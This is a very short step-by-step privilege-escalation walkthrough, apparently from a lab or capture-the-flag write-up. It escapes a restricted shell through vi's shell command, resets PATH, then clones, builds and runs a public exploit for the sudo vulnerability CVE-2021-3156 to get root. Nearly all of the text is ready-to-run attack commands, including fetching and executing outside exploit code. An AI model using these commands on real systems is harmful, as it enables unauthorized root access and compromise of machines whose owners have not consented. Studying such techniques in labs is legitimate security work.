1. Open vi/vim:

```bash
$ vi
```

2. Set shell and open it:

```bash
:set shell=/usr/bin/bash
:shell
$ export PATH='/usr/bin/'
```

3. Download and run the `sudo exploit`:

```bash
$ git clone https://github.com/blasty/CVE-2021-3156
$ cd CVE-2021-3156/
$ make
$ ./sudo-hax-me-a-sandwich 1
```

4. Now you're root!
